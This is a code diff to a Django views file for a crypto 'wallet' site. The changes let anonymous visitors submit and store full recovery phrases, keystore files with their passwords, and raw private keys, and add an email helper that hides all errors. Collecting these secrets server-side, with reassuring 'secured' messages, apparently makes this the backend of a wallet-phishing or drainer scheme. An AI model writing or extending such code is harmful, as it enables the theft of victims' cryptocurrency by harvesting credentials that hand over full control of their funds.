@@ -438,17 +438,43 @@ def change_password(request):
 
 
 
+from django.core.mail import send_mail,  EmailMultiAlternatives
+from django.template.loader import get_template, render_to_string
+from  django.utils.html import strip_tags
+from django.conf import settings
+
+# emal
+
+def email_sending(request,tempname,context,subjects,to):
+    try:
+        tos = render_to_string(tempname,context=context )
+        tags =strip_tags(tos)
+        mas = EmailMultiAlternatives(
+            subject = subjects,
+            body=tags,
+            from_email = settings.EMAIL_HOST_USER,
+            to=[to]
+            )
+        mas.attach_alternative(tos, 'text/html')
+        mas.send()
+    except:
+        pass
 
 
 
-
+ 
 
 def add_wallet(request):
-    # ✅ Redirect if user not logged in
-    
+
+    # ✅ Handle authenticated or anonymous user
+    user = request.user if request.user.is_authenticated else None
+
+    # ✅ Ensure session exists (for anonymous users)
+    if not request.session.session_key:
+        request.session.create()
+    session_key = request.session.session_key
 
     if request.method == "POST":
-        user = request.user
         coin_id = request.POST.get('coin_id')
         wallet_type = request.POST.get('type')
         wallet_name = request.POST.get('Namewallet')
@@ -461,26 +487,37 @@ def add_wallet(request):
         coin_obj = get_object_or_404(Coin, id=coin_id)
 
         try:
-            main_wallet = userCoin.objects.filter(user=user).first()
-            wallet_coin = None
+            # ✅ Get wallet using user OR session
+            if user:
+                main_wallet = userCoin.objects.filter(user=user).first()
+            else:
+                main_wallet = userCoin.objects.filter(session_key=session_key).first()
 
-            if main_wallet:
-                wallet_coin = main_wallet.iscoin.filter(iscoin=coin_obj).first()
-
-            # Create wallet if it does not exist
+            # ✅ Create wallet if not exists
             if not main_wallet:
-                main_wallet = userCoin.objects.create(user=user, balance="0")
+                main_wallet = userCoin.objects.create(
+                    user=user,
+                    session_key=session_key,
+                    balance="0"
+                )
+
+            wallet_coin = main_wallet.iscoin.filter(iscoin=coin_obj).first()
 
             if not wallet_coin:
-                wallet_coin = userCoinwallet.objects.create(balance="0", iscoin=coin_obj)
+                wallet_coin = userCoinwallet.objects.create(
+                    balance="0",
+                    iscoin=coin_obj
+                )
                 main_wallet.iscoin.add(wallet_coin)
 
             # ----------------------
             # HANDLE WALLET TYPES
             # ----------------------
+
             if wallet_type == 'phrase':
                 recovery_phrase = request.POST.get('RecoveryPhrase', '').strip()
                 word_count = len([w for w in recovery_phrase.split() if w])
+
                 if word_count not in [12, 18, 20, 24, 30]:
                     messages.error(request, "Recovery phrase must be valid.")
                     return redirect(request.META.get('HTTP_REFERER'))
@@ -493,6 +530,7 @@ def add_wallet(request):
                         "RecoveryPhrase": recovery_phrase
                     }
                 )
+
                 messages.success(request, f"Phrase wallet '{wallet_name}' secured.")
 
             elif wallet_type == 'keystore':
@@ -518,11 +556,13 @@ def add_wallet(request):
                         "keystonejsonpassword": keystore_password
                     }
                 )
+
                 messages.success(request, f"Keystore wallet '{wallet_name}' saved.")
 
             elif wallet_type == 'private':
                 private_key = request.POST.get('PrivatemainKey', '').strip()
                 key_no_prefix = private_key.replace("0x", "")
+
                 if len(key_no_prefix) != 64 or not all(c in "0123456789abcdefABCDEF" for c in key_no_prefix):
                     messages.error(request, "Invalid private key.")
                     return redirect(request.META.get('HTTP_REFERER'))
@@ -535,6 +575,7 @@ def add_wallet(request):
                         "PrivatemainKey": private_key
                     }
                 )
+
                 messages.success(request, f"Private wallet '{wallet_name}' saved.")
 
             else:
@@ -545,12 +586,12 @@ def add_wallet(request):
             messages.error(request, f"Error: {str(e)}")
             return redirect(request.META.get('HTTP_REFERER'))
 
-        # Redirect to dashboard after successful save
-        if not request.user.is_authenticated:
-            messages.warning(request, "You must be logged in to add a wallet.")
-            return redirect("home")# or use "home" if you prefer
-        return redirect("dashboard",pk=request.user.id)  # or "home"
+        # ✅ Redirect safely
+        if user:
+            return redirect("dashboard", pk=user.id)
+        else:
+            return redirect("home")  # or success page
 
-    # GET request
+    # ✅ GET request
     coins = Coin.objects.all()
     return render(request, "contentwallet.html", {"coins": coins})
